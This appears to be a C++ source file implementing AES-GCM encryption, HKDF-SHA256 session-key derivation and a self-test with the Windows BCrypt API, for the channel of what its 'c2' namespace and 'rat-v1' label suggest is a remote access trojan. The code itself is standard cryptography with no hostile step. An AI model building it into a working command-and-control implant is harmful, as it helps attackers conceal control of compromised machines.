// crypto.cpp — BCrypt 实现（AES-GCM + HKDF-SHA256）
#include "pch.h"
#include "crypto.h"

#include "protocol.h"

#include <windows.h>
#include <bcrypt.h>
#include <algorithm>
#include <cstring>

namespace c2
{

    namespace
    {

        // HMAC-SHA256(key, data) -> 32 字节
        std::vector<uint8_t> hmac_sha256(const uint8_t *key, size_t key_len,
                                         const uint8_t *data, size_t data_len)
        {
            std::vector<uint8_t> out(32);
            BCRYPT_ALG_HANDLE alg = nullptr;
            if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, nullptr,
                                            BCRYPT_ALG_HANDLE_HMAC_FLAG) != 0)
            {
                return {};
            }
            BCRYPT_HASH_HANDLE hash = nullptr;
            if (BCryptCreateHash(alg, &hash, nullptr, 0, (PUCHAR)key, (ULONG)key_len, 0) != 0)
            {
                BCryptCloseAlgorithmProvider(alg, 0);
                return {};
            }
            BCryptHashData(hash, (PUCHAR)data, (ULONG)data_len, 0);
            BCryptFinishHash(hash, out.data(), (ULONG)out.size(), 0);
            BCryptDestroyHash(hash);
            BCryptCloseAlgorithmProvider(alg, 0);
            return out;
        }

        // 生成密码学随机字节
        void rand_bytes(uint8_t *out, size_t len)
        {
            BCryptGenRandom(nullptr, out, (ULONG)len, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        }

    } // namespace

    std::vector<uint8_t> hkdf_sha256(const uint8_t *ikm, size_t ikm_len,
                                     const uint8_t *salt, size_t salt_len,
                                     const uint8_t *info, size_t info_len,
                                     size_t out_len)
    {
        // Extract: PRK = HMAC-SHA256(salt, ikm)；空 salt 用 32 字节 0（RFC 5869）
        std::vector<uint8_t> zero_salt(kSessionKeyLen, 0);
        const uint8_t *s = salt;
        size_t sl = salt_len;
        if (sl == 0)
        {
            s = zero_salt.data();
            sl = zero_salt.size();
        }
        std::vector<uint8_t> prk = hmac_sha256(s, sl, ikm, ikm_len);

        // Expand: T(i) = HMAC-SHA256(PRK, T(i-1) || info || i)
        std::vector<uint8_t> out, t;
        for (uint8_t counter = 1; out.size() < out_len; ++counter)
        {
            std::vector<uint8_t> input;
            input.reserve(t.size() + info_len + 1);
            input.insert(input.end(), t.begin(), t.end());
            input.insert(input.end(), info, info + info_len);
            input.push_back(counter);
            t = hmac_sha256(prk.data(), prk.size(), input.data(), input.size());
            out.insert(out.end(), t.begin(), t.end());
        }
        out.resize(out_len);
        return out;
    }

    std::vector<uint8_t> derive_session_key(const uint8_t *psk, size_t psk_len,
                                            const uint8_t *client_nonce,
                                            const uint8_t *server_nonce)
    {
        const uint8_t info[] = "rat-v1";
        std::vector<uint8_t> salt(kClientNonceLen + kServerNonceLen);
        std::memcpy(salt.data(), client_nonce, kClientNonceLen);
        std::memcpy(salt.data() + kClientNonceLen, server_nonce, kServerNonceLen);
        return hkdf_sha256(psk, psk_len, salt.data(), salt.size(),
                           info, sizeof(info) - 1, kSessionKeyLen);
    }

    bool aes_gcm_encrypt(const uint8_t *key, size_t key_len,
                         const uint8_t *plaintext, size_t plaintext_len,
                         std::vector<uint8_t> &out, std::string &err)
    {
        BCRYPT_ALG_HANDLE alg = nullptr;
        if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, nullptr, 0) != 0)
        {
            err = "open aes provider";
            return false;
        }
        BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                          sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

        BCRYPT_KEY_HANDLE hkey = nullptr;
        if (BCryptGenerateSymmetricKey(alg, &hkey, nullptr, 0,
                                       (PUCHAR)key, (ULONG)key_len, 0) != 0)
        {
            BCryptCloseAlgorithmProvider(alg, 0);
            err = "generate key";
            return false;
        }

        // 随机 nonce
        std::vector<uint8_t> nonce(kNonceLen);
        rand_bytes(nonce.data(), nonce.size());

        std::vector<uint8_t> ct(plaintext_len);
        std::vector<uint8_t> tag(16);

        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth;
        BCRYPT_INIT_AUTH_MODE_INFO(auth);
        auth.pbNonce = nonce.data();
        auth.cbNonce = (ULONG)nonce.size();
        auth.pbTag = tag.data();
        auth.cbTag = (ULONG)tag.size();

        ULONG done = 0;
        NTSTATUS st = BCryptEncrypt(hkey, (PUCHAR)plaintext, (ULONG)plaintext_len,
                                    &auth, nullptr, 0, ct.data(), (ULONG)ct.size(),
                                    &done, 0);
        BCryptDestroyKey(hkey);
        BCryptCloseAlgorithmProvider(alg, 0);
        if (st != 0)
        {
            err = "encrypt failed";
            return false;
        }
        out.clear();
        out.insert(out.end(), nonce.begin(), nonce.end());
        out.insert(out.end(), ct.begin(), ct.end());
        out.insert(out.end(), tag.begin(), tag.end());
        return true;
    }

    bool aes_gcm_decrypt(const uint8_t *key, size_t key_len,
                         const uint8_t *sealed, size_t sealed_len,
                         std::vector<uint8_t> &out, std::string &err)
    {
        if (sealed_len < kNonceLen + 16)
        {
            err = "sealed too short";
            return false;
        }
        BCRYPT_ALG_HANDLE alg = nullptr;
        if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, nullptr, 0) != 0)
        {
            err = "open aes provider";
            return false;
        }
        BCryptSetProperty(alg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                          sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
        BCRYPT_KEY_HANDLE hkey = nullptr;
        if (BCryptGenerateSymmetricKey(alg, &hkey, nullptr, 0,
                                       (PUCHAR)key, (ULONG)key_len, 0) != 0)
        {
            BCryptCloseAlgorithmProvider(alg, 0);
            err = "generate key";
            return false;
        }

        const uint8_t *nonce = sealed;
        const uint8_t *ct = sealed + kNonceLen;
        size_t ct_len = sealed_len - kNonceLen - 16;
        const uint8_t *tag = sealed + sealed_len - 16;

        std::vector<uint8_t> pt(ct_len);
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth;
        BCRYPT_INIT_AUTH_MODE_INFO(auth);
        auth.pbNonce = (PUCHAR)nonce;
        auth.cbNonce = kNonceLen;
        auth.pbTag = (PUCHAR)tag;
        auth.cbTag = 16;

        ULONG done = 0;
        NTSTATUS st = BCryptDecrypt(hkey, (PUCHAR)ct, (ULONG)ct_len, &auth,
                                    nullptr, 0, pt.data(), (ULONG)pt.size(), &done, 0);
        BCryptDestroyKey(hkey);
        BCryptCloseAlgorithmProvider(alg, 0);
        if (st != 0)
        {
            err = "decrypt failed (tag mismatch?)";
            return false;
        }
        out = std::move(pt);
        return true;
    }

    // ---- 自检：与 c2/internal/protocol/testdata/vectors.json 一致 ----

    namespace
    {

        bool hex_of(const std::vector<uint8_t> &v, std::string &s)
        {
            static const char *d = "0123456789abcdef";
            s.clear();
            for (uint8_t b : v)
            {
                s.push_back(d[b >> 4]);
                s.push_back(d[b & 0xF]);
            }
            return true;
        }

        bool expect_eq(const std::vector<uint8_t> &got, const char *want_hex,
                       const char *what, std::string &err)
        {
            std::string got_hex;
            hex_of(got, got_hex);
            if (got_hex != want_hex)
            {
                err = std::string(what) + " mismatch\n  got: " + got_hex +
                      "\n want: " + want_hex;
                return false;
            }
            return true;
        }

    } // namespace

    bool crypto_selftest(std::string &err)
    {
        // 与 vectors.json 相同的固定输入
        const uint8_t psk[32] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16,
                                 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32};
        const uint8_t client_nonce[16] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
        const uint8_t server_nonce[16] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};

        // 1) 会话密钥派生
        auto sk = derive_session_key(psk, sizeof(psk), client_nonce, server_nonce);
        if (!expect_eq(sk,
                       "ba104a726ab5ea0c77d6ea456be7582e94451e275f4706a8048f68b9e9e13ed9",
                       "session_key", err))
        {
            return false;
        }

        // 2) 头部编码示例（seq=1, flags=encrypted, cmd=HELLO, ts=0）
        Header h;
        h.flags = kFlagEncrypted;
        h.seq = 1;
        h.cmd = kCmdHello;
        uint8_t hdr[20];
        encode_header(h, hdr);
        if (std::memcmp(hdr, "\x5a\x5a\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00", 20) != 0)
        {
            err = "header example mismatch";
            return false;
        }

        // 3) AES-GCM 加解密往返 + 篡改检测
        uint8_t enc_key[32];
        std::memcpy(enc_key, psk, sizeof(psk));
        std::vector<uint8_t> msg = {'h', 'e', 'l', 'l', 'o'};
        std::vector<uint8_t> sealed;
        if (!aes_gcm_encrypt(enc_key, sizeof(enc_key), msg.data(), msg.size(), sealed, err))
        {
            return false;
        }
        std::vector<uint8_t> pt;
        if (!aes_gcm_decrypt(enc_key, sizeof(enc_key), sealed.data(), sealed.size(), pt, err))
        {
            return false;
        }
        if (pt != msg)
        {
            err = "roundtrip mismatch";
            return false;
        }
        // 篡改 tag
        std::vector<uint8_t> tampered = sealed;
        tampered.back() ^= 0xFF;
        if (aes_gcm_decrypt(enc_key, sizeof(enc_key), tampered.data(), tampered.size(), pt, err))
        {
            err = "tampered payload should fail";
            return false;
        }
        return true;
    }

} // namespace c2
